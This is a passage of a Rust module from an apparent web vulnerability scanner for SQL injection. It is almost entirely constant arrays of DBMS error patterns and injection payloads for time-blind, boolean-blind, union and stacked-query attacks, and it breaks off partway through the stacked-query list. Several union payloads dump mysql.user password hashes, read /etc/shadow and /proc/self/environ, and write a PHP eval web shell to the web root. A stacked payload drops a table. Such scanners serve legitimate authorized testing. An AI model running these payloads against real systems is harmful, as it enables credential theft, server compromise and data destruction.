//! SQL Injection detection — error-based, boolean-blind, time-blind, OOB, stacked queries.

use grym_core::{
    AssetRef, Confidence, Evidence, Finding, ScopedClient, ScopedClientError, Severity,
    TechniqueTier,
};
use regex::Regex;
use url::Url;

/// SQL error patterns for error-based detection across DBMS types (~200 patterns).
const SQL_ERROR_PATTERNS: &[&str] = &[
    // ── MySQL ─────────────────────────────────────────────────────────────
    r"(?i)you have an error in your sql syntax",
    r"(?i)warning.*mysql",
    r"(?i)unclosed quotation mark",
    r"(?i)mysql_fetch",
    r"(?i)mysql_num_rows",
    r"(?i)mysql_result",
    r"(?i)mysql_query",
    r"(?i)SQLSTATE\[",
    r"(?i)sqlstate\[hy000\]",
    r"(?i)Unknown column.*in 'field list'",
    r"(?i)Column count.*not match",
    r"(?i)Table.*doesn't exist",
    r"(?i)supplied argument is not a valid MySQL",
    r"(?i)check the manual that corresponds to your MySQL",
    r"(?i)check the manual that corresponds to your MariaDB",
    r"(?i)com\.mysql\.jdbc",
    r"(?i)Operand should contain \d+ column",
    r"(?i)Duplicate entry .*for key",
    r"(?i)Subquery returns more than 1 row",
    r"(?i)PROCEDURE ANALYSE",
    r"(?i)MySqlClient\.",
    r"(?i)valid MySQL result resource",
    r"(?i)MySQL server version for the right syntax",
    r"(?i)SQL syntax.*near",
    // ── MariaDB ────────────────────────────────────────────────────────────
    r"(?i)MariaDB server version",
    r"(?i)com\.mariadb\.jdbc",
    // ── MSSQL / T-SQL ─────────────────────────────────────────────────────
    r"(?i)Microsoft.*ODBC.*Driver",
    r"(?i)microsoft.*sql.*server.*error",
    r"(?i)Incorrect syntax near",
    r"(?i)Unclosed quotation mark after the character string",
    r"(?i)System\.Data\.SqlClient",
    r"(?i)\[Macromedia\]\[SQLServer JDBC Driver\]",
    r"(?i)Invalid query",
    r"(?i)Query failed",
    r"(?i)SQL Server.*Driver",
    r"(?i)com\.microsoft\.sqlserver\.jdbc",
    r"(?i)Invalid column name",
    r"(?i)Arithmetic overflow error",
    r"(?i)The conversion of a varchar",
    r"(?i)String or binary data would be truncated",
    r"(?i)Invalid object name",
    r"(?i)Ambiguous column name",
    r"(?i)Conversion failed when converting",
    r"(?i)SQLServerException",
    r"(?i)Procedure or function .* expects parameter",
    // ── PostgreSQL ─────────────────────────────────────────────────────────
    r"(?i)PostgreSQL.*ERROR",
    r"(?i)syntax error.*at or near",
    r"(?i)org\.postgresql\.util\.PSQLException",
    r"(?i)pg_query",
    r"(?i)pg_exec",
    r"(?i)ERROR:\s+syntax error",
    r"(?i)ERROR:\s+column .* does not exist",
    r"(?i)ERROR:\s+relation .* does not exist",
    r"(?i)invalid input syntax for",
    r"(?i)unterminated quoted string",
    r"(?i)org\.postgresql",
    r"(?i)Query failed\s*:\s*ERROR",
    // ── Oracle ─────────────────────────────────────────────────────────────
    r"(?i)ORA-[0-9]{5}",
    r"(?i)quoted string not properly terminated",
    r"(?i)SQL command not properly ended",
    r"(?i)ora-01756",
    r"(?i)ORA-00933",
    r"(?i)ORA-00936",
    r"(?i)ORA-00921",
    r"(?i)ORA-00942",
    r"(?i)ORA-01489",
    r"(?i)ORA-06512",
    r"(?i)oracle\.jdbc",
    // ── SQLite ─────────────────────────────────────────────────────────────
    r"(?i)sqlite3\.OperationalError",
    r"(?i)sQLite/JDBCDriver",
    r"(?i)SQLite.*error",
    r"(?i)SQLITE_ERROR",
    r"(?i)unrecognized token:",
    r"(?i)no such column:",
    r"(?i)no such table:",
    // ── Generic JDBC / ODBC / framework ────────────────────────────────────
    r"(?i)java\.sql\.SQLException",
    r"(?i)javax\.servlet\.ServletException",
    r"(?i)org\.apache\.jasper",
    r"(?i)org\.apache\.tomcat",
    r"(?i)org\.hibernate",
    r"(?i)Syntax error or access violation",
    r"(?i)database error",
    r"(?i)error in your SQL",
    r"(?i)valid \(database object name\)",
    r"(?i)database.*exception",
    r"(?i)Unkown column",
    r"(?i)gibt kein Ergebnis",
    r"(?i)division by zero.*SQL",
    r"(?i)Dynamic SQL Error",
    r"(?i)ODBC SQL Server Driver",
    r"(?i)DB2 SQL error",
    r"(?i)SQLCODE=-[0-9]+",
    r"(?i)Sybase message:",
    r"(?i)InfluxDB error",
    r"(?i)cockroachdb",
    r"(?i)Couchbase.*error",
    r"(?i)MongoError",
    r"(?i)com\.mongodb\.MongoException",
    r"(?i)Cassandra.*InvalidRequest",
    r"(?i)ClickHouse exception",
    r"(?i)Presto.*Exception",
    r"(?i)Snowflake.*error",
    r"(?i)BigQuery.*error",
    r"(?i)Hive.*Exception",
    r"(?i)SparkException",
    r"(?i)NLException",
    r"(?i)Teradata Database",
    r"(?i)SAP DBTech JDBC",
    r"(?i)net\.ufosc\.hibernate",
    r"(?i)HQL.*error",
    r"(?i)JPQL syntax error",
    r"(?i)sqlite_error",
    r"(?i)database_error",
    r"(?i)sql_error",
];

/// Time-based blind SQLi payloads (~120, multi-DBMS).
const TIME_BLIND_PAYLOADS: &[&str] = &[
    // ── MySQL / MariaDB ───────────────────────────────────────────────────
    "' OR SLEEP(5)--",
    "' OR SLEEP(5)#",
    "' OR SLEEP(5) AND '1'='1",
    "\" OR SLEEP(5)--",
    "1 OR SLEEP(5)--",
    "1 AND SLEEP(5)--",
    "' OR 1=1 AND SLEEP(5)--",
    "' OR IF(1=1,SLEEP(5),0)--",
    "' AND IF(1=1,SLEEP(5),0)--",
    "' OR (SELECT SLEEP(5))--",
    "' OR (SELECT SLEEP(5)) AND '1'='1",
    "' OR SLEEP(5)-- -",
    "' OR SLEEP(5) /*",
    "1' AND SLEEP(5)-- -",
    "1' AND IF(1=1,SLEEP(5),0)-- -",
    "1\" AND SLEEP(5)--",
    "' OR BENCHMARK(5000000,SHA1('test'))--",
    "' OR BENCHMARK(10000000,MD5('test'))--",
    "' OR BENCHMARK(5000000,SHA2('test',256))--",
    "' OR BENCHMARK(5000000,ENCODE('t','k'))--",
    "' OR BENCHMARK(5000000,AES_ENCRYPT('t','k'))--",
    "1 OR BENCHMARK(10000000,SHA1('x'))--",
    "' AND (SELECT * FROM (SELECT(SLEEP(5)))x)--",
    "' AND (SELECT 1 FROM (SELECT SLEEP(5))a)--",
    "' AND SLEEP(5) AND '1'='1",
    "' OR 1=1 OR SLEEP(5)--",
    "' OR (SELECT COUNT(*) FROM information_schema.tables)>0 AND SLEEP(5)--",
    "' XOR SLEEP(5)--",
    "' OR NOT(SLEEP(5))--",
    "' OR SLEEP(5) OR '",
    "1' OR SLEEP(5) OR '1'='1",
    "1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT SLEEP(5)),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    // ── MSSQL ──────────────────────────────────────────────────────────────
    "'; WAITFOR DELAY '0:0:5'--",
    "'; WAITFOR DELAY '0:0:05'--",
    "'; WAITFOR DELAY '00:00:05'--",
    "1'; WAITFOR DELAY '0:0:5'--",
    "1'; IF (1=1) WAITFOR DELAY '0:0:5'--",
    "'; WAITFOR DELAY '0:0:5' AND '1'='1",
    "';WAITFOR DELAY '0:0:5'--",
    "1\" ; WAITFOR DELAY '0:0:5'--",
    "'; DECLARE @x varchar(8);SET @x=REPLICATE('a',5);WAITFOR DELAY '0:0:5'--",
    "' OR WAITFOR DELAY '0:0:5'--",
    // ── PostgreSQL ─────────────────────────────────────────────────────────
    "' OR pg_sleep(5)--",
    "1; SELECT pg_sleep(5)--",
    "' AND pg_sleep(5)--",
    "1 AND pg_sleep(5)--",
    "' OR 1=1; SELECT pg_sleep(5)--",
    "' OR (SELECT pg_sleep(5))--",
    "' OR pg_sleep(5)::text IS NOT NULL--",
    "'||pg_sleep(5)--",
    // ── Oracle ─────────────────────────────────────────────────────────────
    "' OR dbms_pipe.receive_message(('a'),5)--",
    "' OR (SELECT dbms_pipe.receive_message(('a'),5) FROM dual)--",
    "' AND 1=(SELECT COUNT(*) FROM all_users t1, all_users t2, all_users t3, all_users t4)--",
    "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--",
    "||UTL_INADDR.GET_HOST_ADDRESS('10.0.0.1')||",
    // ── SQLite (no sleep; heavy recursion) ─────────────────────────────────
    "') OR (SELECT randomblob(100000000))--",
    "' OR (SELECT count(*) FROM pragma_table_info('t'),pragma_table_info('t'),pragma_table_info('t'))--",
    // ── Generic / weird whitespace ─────────────────────────────────────────
    "'\tOR\tSLEEP(5)--",
    "'\nOR\nSLEEP(5)--",
    "'\rOR\rSLEEP(5)--",
    "'\u{00a0}OR\u{00a0}SLEEP(5)--",
    "'\u{3000}OR\u{3000}SLEEP(5)--",
    "'\u{200b}OR\u{200b}SLEEP(5)--",
    "'\u{200a}OR\u{200a}SLEEP(5)--",
    "'/**/OR/**/SLEEP(5)/**/--",
    "'/*!50000OR*//*!50000SLEEP(5)*/--",
    "'%0AOR%0ASLEEP(5)%0A--",
    "'%09OR%09SLEEP(5)--",
    "'%00OR%00SLEEP(5)--",
    "'+OR+SLEEP(5)+--",
    "'--+OR+SLEEP(5)+--",
    "'/**/OR/**/IF(1=1,SLEEP(5),0)/**/--",
    "1'||SLEEP(5)||'",
    "1' AND IFNULL(SLEEP(5),1)--",
    "' AND IFNULL(SLEEP(5),'x')='x'",
    "' OR SLEEP(5)#'",
    "' OR SLEEP(5);#",
    "1 AND SLEEP(5)#",
    "1 AND (SELECT 1 FROM (SELECT SLEEP(5))x)#",
    "1 AND (SELECT 1 FROM (SELECT SLEEP(5))a) AND 1=1--",
    "' AND (SELECT 1 FROM (SELECT SLEEP(5))x)-- -",
    "'; SELECT SLEEP(5);--",
    "' UNION SELECT SLEEP(5)--",
    "' UNION ALL SELECT SLEEP(5),2,3--",
    "1 UNION SELECT SLEEP(5)--",
    "' UNION SELECT NULL,NULL,SLEEP(5)--",
    "' UNION SELECT SLEEP(5),SLEEP(5)--",
    "' AND ORD(MID((SELECT IFNULL(CAST(SLEEP(5) AS CHAR),0)),1,1))>0--",
    "' AND (SELECT 1 FROM (SELECT SLEEP(5))x) AND 1=1--",
    "1 AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT SLEEP(5)),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "1 AND (SELECT * FROM (SELECT(SLEEP(5)))x)--",
    "1' AND (SELECT * FROM (SELECT(SLEEP(5)))x)-- -",
    "' AND SLEEP(5) BETWEEN 1 AND 1--",
    "1 AND SLEEP(5) BETWEEN 1 AND 1--",
    "' OR RLIKE(SLEEP(5))--",
    "' OR SLEEP(5) RLIKE '1'--",
    "' AND SLEEP(5) RLIKE '1'--",
    "1' OR SLEEP(5) RLIKE '1'--",
    "'||dbms_lock.sleep(5)--",
    "' AND (SELECT COUNT(*) FROM dba_objects t1, dba_objects t2) > 0--",
    "' AND (SELECT COUNT(*) FROM all_objects t1, all_objects t2, all_objects t3, all_objects t4) > 0--",
    "' AND (SELECT COUNT(*) FROM user_tables t1, user_tables t2, user_tables t3) > 0--",
    "'; SELECT pg_sleep(5); --",
    "1; SELECT pg_sleep(5); --",
    "1'; SELECT pg_sleep(5); --",
    "';SELECT pg_sleep(5);--",
    "1;SELECT pg_sleep(5);--",
    "' AND pg_sleep(5)::text='pg_sleep'--",
    "' OR pg_sleep(5)::text IS NOT NULL#",
    "1 AND 1=pg_sleep(5)--",
    "1 AND 1=pg_sleep(5)::int--",
    "' AND 1=CAST(pg_sleep(5) AS int)--",
    "' OR 1=CAST(pg_sleep(5) AS int)--",
    "1; SELECT 1 FROM pg_sleep(5)--",
    "' OR (SELECT pg_sleep(5))::text IS NOT NULL--",
    "'||(SELECT pg_sleep(5))--",
    "1||pg_sleep(5)--",
    "' AND (SELECT count(*) FROM generate_series(1,100000000))>0--",
    "' AND (SELECT count(*) FROM generate_series(1,100000000))--",
    "'; WAITFOR DELAY '0:0:5'-- -",
    "1; WAITFOR DELAY '0:0:5'--",
    "1; WAITFOR DELAY '0:0:5'-- -",
    "'; WAITFOR DELAY '00:00:05';--",
    "'; WAITFOR DELAY '0:0:5' AND 1=1--",
    "' OR 1=1; WAITFOR DELAY '0:0:5'--",
    "' OR 1=1;WAITFOR DELAY '0:0:5'--",
    "1' OR 1=1;WAITFOR DELAY '0:0:5'--",
    "' AND (SELECT COUNT(*) FROM sys.objects)>0; WAITFOR DELAY '0:0:5'--",
    "'; EXEC('WAITFOR DELAY ''0:0:5''')--",
    "1'; EXEC('WAITFOR DELAY ''0:0:5''')--",
    "'; EXEC sp_makewebtask 'x','select 1';WAITFOR DELAY '0:0:5'--",
];

/// Boolean-based blind SQLi payloads (true/false pairs, ~90 pairs).
const BOOLEAN_BLIND_PAYLOADS: &[(&str, &str)] = &[
    ("' OR 1=1--", "' OR 1=2--"),
    ("' AND 1=1--", "' AND 1=2--"),
    ("' OR 'a'='a", "' OR 'a'='b"),
    ("' OR 'a'='a'--", "' OR 'a'='b'--"),
    ("' OR 1=1#", "' OR 1=2#"),
    ("1 OR 1=1", "1 OR 1=2"),
    ("1 AND 1=1", "1 AND 1=2"),
    ("1 OR 'a'='a", "1 OR 'a'='b"),
    ("1 AND 'a'='a", "1 AND 'a'='b"),
    ("\" OR \"a\"=\"a", "\" OR \"a\"=\"b"),
    ("\" OR 1=1--", "\" OR 1=2--"),
    ("1\" OR 1=1--", "1\" OR 1=2--"),
    ("') OR ('a'='a", "') OR ('a'='b"),
    ("') OR ('a'='a'--", "') OR ('a'='b'--"),
    ("') AND ('a'='a", "') AND ('a'='b"),
    ("')) OR (('a'='a", "')) OR (('a'='b"),
    ("')) AND (('a'='a", "')) AND (('a'='b"),
    ("' OR 'a'='a'#", "' OR 'a'='b'#"),
    ("'||'a'='a", "'||'a'='b"),
    ("' AND 'a'='a", "' AND 'a'='b"),
    ("1'||'a'='a", "1'||'a'='b"),
    ("1' AND 'a'='a", "1' AND 'a'='b"),
    ("1' AND '1'='1", "1' AND '1'='2"),
    ("1' OR '1'='1", "1' OR '1'='2"),
    ("' OR '1'='1'--", "' OR '1'='2'--"),
    ("' AND '1'='1'--", "' AND '1'='2'--"),
    (
        "' OR ASCII(SUBSTRING((SELECT DATABASE()),1,1))>0--",
        "' OR ASCII(SUBSTRING((SELECT DATABASE()),1,1))<0--",
    ),
    (
        "' AND ASCII(SUBSTRING((SELECT DATABASE()),1,1))>0--",
        "' AND ASCII(SUBSTRING((SELECT DATABASE()),1,1))<0--",
    ),
    (
        "1 AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
        "1 AND (SELECT COUNT(*) FROM information_schema.tables)<0--",
    ),
    (
        "' AND (SELECT LENGTH(DATABASE()))>0--",
        "' AND (SELECT LENGTH(DATABASE()))<0--",
    ),
    (
        "1 AND (SELECT LENGTH(DATABASE()))>0--",
        "1 AND (SELECT LENGTH(DATABASE()))<0--",
    ),
    (
        "' AND ORD(MID((SELECT IFNULL(CAST(DATABASE() AS CHAR),0)),1,1))>0--",
        "' AND ORD(MID((SELECT IFNULL(CAST(DATABASE() AS CHAR),0)),1,1))<0--",
    ),
    ("1' AND LENGTH(USER())>0--", "1' AND LENGTH(USER())<0--"),
    ("' AND (SELECT 1) = 1--", "' AND (SELECT 1) = 2--"),
    ("1 AND (SELECT 1) = 1--", "1 AND (SELECT 1) = 2--"),
    (
        "' AND (SELECT 1)=1 AND 'a'='a",
        "' AND (SELECT 1)=1 AND 'a'='b",
    ),
    (
        "' AND EXISTS(SELECT * FROM information_schema.tables)--",
        "' AND NOT EXISTS(SELECT * FROM information_schema.tables)--",
    ),
    (
        "1 AND EXISTS(SELECT * FROM information_schema.tables)--",
        "1 AND NOT EXISTS(SELECT * FROM information_schema.tables)--",
    ),
    (
        "1' AND EXISTS(SELECT 1 FROM information_schema.tables)--",
        "1' AND NOT EXISTS(SELECT 1 FROM information_schema.tables)--",
    ),
    (
        "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
        "' AND (SELECT COUNT(*) FROM information_schema.tables)<0--",
    ),
    (
        "' AND (SELECT COUNT(*) FROM information_schema.columns)>0--",
        "' AND (SELECT COUNT(*) FROM information_schema.columns)<0--",
    ),
    (
        "' AND (SELECT COUNT(*) FROM information_schema.schemata)>0--",
        "' AND (SELECT COUNT(*) FROM information_schema.schemata)<0--",
    ),
    ("' AND 1 IN (SELECT 1)--", "' AND 1 IN (SELECT 2)--"),
    ("1 AND 1 IN (SELECT 1)--", "1 AND 1 IN (SELECT 2)--"),
    ("' AND 1 NOT IN (SELECT 1)--", "' AND 1 NOT IN (SELECT 2)--"),
    // ── PostgreSQL ─────────────────────────────────────────────────────────
    ("' AND 1=1::int--", "' AND 1=2::int--"),
    ("' OR 1::int=1--", "' OR 1::int=2--"),
    ("1 AND 1=1::int--", "1 AND 1=2::int--"),
    ("' AND (SELECT 1::int)=1--", "' AND (SELECT 1::int)=2--"),
    ("1 AND (SELECT 1::int)=1--", "1 AND (SELECT 1::int)=2--"),
    (
        "' AND current_setting('is_superuser')='on'--",
        "' AND current_setting('is_superuser')='off'--",
    ),
    (
        "1 AND current_setting('is_superuser')='on'--",
        "1 AND current_setting('is_superuser')='off'--",
    ),
    (
        "' AND version() LIKE '%PostgreSQL%'--",
        "' AND version() LIKE '%MySQL%'--",
    ),
    (
        "1 AND version() LIKE '%PostgreSQL%'--",
        "1 AND version() LIKE '%MySQL%'--",
    ),
    (
        "' AND current_database() IS NOT NULL--",
        "' AND current_database() IS NULL--",
    ),
    (
        "' AND (SELECT COUNT(*) FROM pg_tables)>0--",
        "' AND (SELECT COUNT(*) FROM pg_tables)<0--",
    ),
    (
        "1 AND (SELECT COUNT(*) FROM pg_tables)>0--",
        "1 AND (SELECT COUNT(*) FROM pg_tables)<0--",
    ),
    (
        "' AND (SELECT COUNT(*) FROM pg_user)>0--",
        "' AND (SELECT COUNT(*) FROM pg_user)<0--",
    ),
    // ── MSSQL ──────────────────────────────────────────────────────────────
    ("' AND 1=1--", "' AND 1=2--"),
    ("1' AND 1=1--", "1' AND 1=2--"),
    (
        "' AND (SELECT COUNT(*) FROM sys.tables)>0--",
        "' AND (SELECT COUNT(*) FROM sys.tables)<0--",
    ),
    (
        "1 AND (SELECT COUNT(*) FROM sys.tables)>0--",
        "1 AND (SELECT COUNT(*) FROM sys.tables)<0--",
    ),
    (
        "' AND (SELECT COUNT(*) FROM sys.databases)>0--",
        "' AND (SELECT COUNT(*) FROM sys.databases)<0--",
    ),
    ("' AND USER_NAME()='dbo'--", "' AND USER_NAME()<>'dbo'--"),
    ("' AND SYSTEM_USER='sa'--", "' AND SYSTEM_USER<>'sa'--"),
    ("1 AND SYSTEM_USER='sa'--", "1 AND SYSTEM_USER<>'sa'--"),
    (
        "' AND (SELECT IS_SRVROLEMEMBER('sysadmin'))=1--",
        "' AND (SELECT IS_SRVROLEMEMBER('sysadmin'))=0--",
    ),
    // ── Oracle ─────────────────────────────────────────────────────────────
    ("' AND 1=1--", "' AND 1=2--"),
    ("1 AND 1=1--", "1 AND 1=2--"),
    (
        "' AND (SELECT COUNT(*) FROM user_tables)>0--",
        "' AND (SELECT COUNT(*) FROM user_tables)<0--",
    ),
    (
        "' AND (SELECT COUNT(*) FROM all_tables)>0--",
        "' AND (SELECT COUNT(*) FROM all_tables)<0--",
    ),
    ("' AND ROWNUM=1--", "' AND ROWNUM=2--"),
    ("1 AND ROWNUM=1--", "1 AND ROWNUM=2--"),
    (
        "' AND 1=1 UNION SELECT 1 FROM dual--",
        "' AND 1=2 UNION SELECT 1 FROM dual--",
    ),
    // ── SQLite ─────────────────────────────────────────────────────────────
    ("' AND 1=1--", "' AND 1=2--"),
    (
        "' AND (SELECT COUNT(*) FROM sqlite_master)>0--",
        "' AND (SELECT COUNT(*) FROM sqlite_master)<0--",
    ),
    (
        "' AND (SELECT COUNT(*) FROM sqlite_schema)>0--",
        "' AND (SELECT COUNT(*) FROM sqlite_schema)<0--",
    ),
    (
        "1 AND (SELECT COUNT(*) FROM sqlite_master)>0--",
        "1 AND (SELECT COUNT(*) FROM sqlite_master)<0--",
    ),
    (
        "' AND length(sqlite_version())>0--",
        "' AND length(sqlite_version())<0--",
    ),
    // ── Unicode whitespace boolean ─────────────────────────────────────────
    ("'\u{00a0}OR\u{00a0}1=1--", "'\u{00a0}OR\u{00a0}1=2--"),
    ("'\u{3000}OR\u{3000}1=1--", "'\u{3000}OR\u{3000}1=2--"),
    ("'\u{200b}OR\u{200b}1=1--", "'\u{200b}OR\u{200b}1=2--"),
    ("'/**/OR/**/1=1--", "'/**/OR/**/1=2--"),
    ("1'/**/AND/**/1=1--", "1'/**/AND/**/1=2--"),
    ("'\u{180e}OR\u{180e}1=1--", "'\u{180e}OR\u{180e}1=2--"),
];

/// Union-based SQLi payloads with various column counts, encodings and DBMS quirks (~120).
const UNION_PAYLOADS: &[&str] = &[
    // ── MySQL — NULL probe ────────────────────────────────────────────────
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
    "' UNION ALL SELECT NULL--",
    "' UNION ALL SELECT NULL,NULL--",
    "' UNION ALL SELECT NULL,NULL,NULL--",
    "' UNION ALL SELECT NULL,NULL,NULL,NULL--",
    "' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL--",
    "' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL--",
    "' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
    "' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
    "' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
    "' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
    "1 UNION SELECT NULL--",
    "1 UNION SELECT NULL,NULL--",
    "1 UNION SELECT NULL,NULL,NULL--",
    "1 UNION SELECT NULL,NULL,NULL,NULL--",
    "1 UNION SELECT NULL,NULL,NULL,NULL,NULL--",
    "1 UNION ALL SELECT NULL,NULL,NULL--",
    // ── MySQL — value probes ──────────────────────────────────────────────
    "' UNION SELECT 1,2,3--",
    "' UNION SELECT 'a','b','c'--",
    "' UNION SELECT 1,2,3,4--",
    "' UNION SELECT 1,2,3,4,5--",
    "1 UNION SELECT 1,2,3--",
    "1 UNION SELECT 'a','b','c'--",
    "' UNION SELECT @@version,NULL,NULL--",
    "' UNION SELECT @@version,NULL--",
    "' UNION SELECT @@datadir,@@version,NULL--",
    "' UNION SELECT user(),database(),version()--",
    "' UNION SELECT user(),database()--",
    "' UNION SELECT @@hostname,@@version_compile_os--",
    "' UNION SELECT @@global.version_compile_os,NULL,NULL--",
    "' UNION SELECT @@GLOBAL.VERSION,NULL--",
    "' UNION SELECT 1,@@version--",
    "' UNION SELECT 1,database()--",
    "' UNION SELECT 1,user()--",
    "' UNION SELECT 1,@@basedir--",
    "' UNION SELECT 1,@@tmpdir--",
    "' UNION SELECT 1,@@hostname--",
    "' UNION SELECT 1,@@port--",
    "' UNION SELECT 1,@@sql_mode--",
    "' UNION SELECT 1,@@version_comment--",
    "' UNION SELECT 1,@@version_compile_machine--",
    "' UNION SELECT 1,@@version_compile_os--",
    "' UNION SELECT 1,@@secure_file_priv--",
    "' UNION SELECT 1,@@plugin_dir--",
    "' UNION SELECT 1,@@general_log_file--",
    "' UNION SELECT 1,@@slow_query_log_file--",
    "' UNION SELECT 1,@@log_bin--",
    "' UNION SELECT 1,@@gtid_mode--",
    "' UNION SELECT 1,@@transaction_isolation--",
    // ── MySQL — data extraction ───────────────────────────────────────────
    "' UNION SELECT COUNT(*),GROUP_CONCAT(table_name) FROM information_schema.tables--",
    "' UNION SELECT GROUP_CONCAT(table_name),2,3 FROM information_schema.tables--",
    "' UNION SELECT GROUP_CONCAT(schema_name),2,3 FROM information_schema.schemata--",
    "' UNION SELECT GROUP_CONCAT(column_name),2,3 FROM information_schema.columns--",
    "' UNION SELECT table_name,column_name,3 FROM information_schema.columns LIMIT 1--",
    "' UNION SELECT 1,GROUP_CONCAT(COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA=DATABASE()--",
    "' UNION SELECT 1,GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()--",
    "' UNION SELECT 1,GROUP_CONCAT(user,0x3a,password) FROM mysql.user--",
    "' UNION SELECT 1,GROUP_CONCAT(user,0x3a,authentication_string) FROM mysql.user--",
    "' UNION SELECT 1,LOAD_FILE('/etc/passwd')--",
    "' UNION SELECT LOAD_FILE('/etc/passwd')--",
    "' UNION SELECT 1,LOAD_FILE(0x2f6574632f706173737764)--",
    "' UNION SELECT 1,LOAD_FILE(CHAR(47,101,116,99,47,112,97,115,115,119,100))--",
    "' UNION SELECT 1,LOAD_FILE(CONCAT(CHAR(47),CHAR(101)))--",
    "' UNION SELECT 1,LOAD_FILE('/etc/shadow')--",
    "' UNION SELECT 1,LOAD_FILE('/etc/hosts')--",
    "' UNION SELECT 1,LOAD_FILE('/proc/self/environ')--",
    "' UNION SELECT 1,LOAD_FILE('C:\\Windows\\win.ini')--",
    "' UNION SELECT 1,LOAD_FILE('C:\\boot.ini')--",
    // ── MySQL — file write ────────────────────────────────────────────────
    "' UNION SELECT '<?php phpinfo();?>',2,3 INTO OUTFILE '/var/www/html/grym_test.php'--",
    "' UNION SELECT '<?php eval($_POST[c]);?>',2 INTO OUTFILE '/tmp/g.txt'--",
    "' UNION SELECT 1,2,3 INTO DUMPFILE '/tmp/g.txt'--",
    // ── MSSQL ─────────────────────────────────────────────────────────────
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "1 UNION SELECT @@version--",
    "' UNION SELECT @@VERSION--",
    "1 UNION SELECT DB_NAME()--",
    "1 UNION SELECT USER_NAME()--",
    "1 UNION SELECT SUSER_SNAME()--",
    "1 UNION SELECT @@SERVERNAME--",
    "1 UNION SELECT @@SERVICENAME--",
    "1 UNION SELECT @@SPID--",
    "1 UNION SELECT @@IDENTITY--",
    "1 UNION SELECT system_user--",
    "1 UNION SELECT user--",
    "1 UNION SELECT current_user--",
    "1 UNION SELECT name FROM sys.databases--",
    "1 UNION SELECT name FROM sys.tables--",
    "1 UNION SELECT name FROM sys.columns--",
    "1 UNION SELECT name FROM master.dbo.sysdatabases--",
    "1 UNION SELECT name FROM sysobjects--",
    "' UNION SELECT name FROM master..sysdatabases--",
    // ── PostgreSQL ─────────────────────────────────────────────────────────
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL--",
    "' UNION SELECT version()--",
    "' UNION SELECT current_database()--",
    "' UNION SELECT current_user--",
    "' UNION SELECT current_setting('server_version')--",
    "1 UNION SELECT version()--",
    "1 UNION SELECT current_database(),current_user--",
    "1 UNION SELECT table_name FROM information_schema.tables LIMIT 1--",
    "1 UNION SELECT column_name FROM information_schema.columns LIMIT 1--",
    "1 UNION SELECT datname FROM pg_database--",
    "1 UNION SELECT usename FROM pg_user--",
    "1 UNION SELECT current_setting('data_directory')--",
    "1 UNION SELECT current_setting('config_file')--",
    "1 UNION SELECT current_setting('hba_file')--",
    "1 UNION SELECT current_setting('listen_addresses')--",
    "1 UNION SELECT current_setting('port')--",
    // ── Oracle ─────────────────────────────────────────────────────────────
    "' UNION SELECT NULL FROM dual--",
    "' UNION SELECT NULL,NULL FROM dual--",
    "' UNION SELECT NULL,NULL,NULL FROM dual--",
    "1 UNION SELECT banner FROM v$version--",
    "1 UNION SELECT username FROM all_users--",
    "1 UNION SELECT table_name FROM user_tables--",
    "1 UNION SELECT column_name FROM user_tab_columns--",
    "1 UNION SELECT name FROM v$database--",
    "1 UNION SELECT global_name FROM global_name--",
    "1 UNION SELECT SYS_CONTEXT('USERENV','CURRENT_USER') FROM dual--",
    "1 UNION SELECT SYS_CONTEXT('USERENV','DB_NAME') FROM dual--",
    "1 UNION SELECT SYS_CONTEXT('USERENV','SERVER_HOST') FROM dual--",
    "1 UNION SELECT USER FROM dual--",
    "1 UNION SELECT UTL_INADDR.GET_HOST_ADDRESS('localhost') FROM dual--",
    // ── SQLite ─────────────────────────────────────────────────────────────
    "' UNION SELECT sql FROM sqlite_master--",
    "' UNION SELECT name FROM sqlite_master--",
    "' UNION SELECT sqlite_version()--",
    "1 UNION SELECT sql FROM sqlite_master--",
    // ── Encoded / whitespace-comment variants ─────────────────────────────
    "'\u{00a0}UNION\u{00a0}SELECT\u{00a0}NULL--",
    "'/**/UNION/**/SELECT/**/NULL/**/--",
    "'/*!UNION*/SELECT NULL--",
    "1' UNION/**/SELECT/**/NULL--",
    "' UNION%20SELECT%20NULL--",
    "'+UNION+SELECT+NULL--",
    "' UNION SELECT NULL,#",
    "' UNION SELECT NULL LIMIT 1--",
    "' UNION SELECT NULL OFFSET 0--",
];

/// Stacked query payloads (~90).
const STACKED_QUERY_PAYLOADS: &[&str] = &[
    "'; SELECT SLEEP(5)--",
    "'; SELECT BENCHMARK(5000000,SHA1('test'))--",
    "'; WAITFOR DELAY '0:0:5'--",
    "'; SELECT pg_sleep(5)--",
    "'; DROP TABLE IF EXISTS test--",
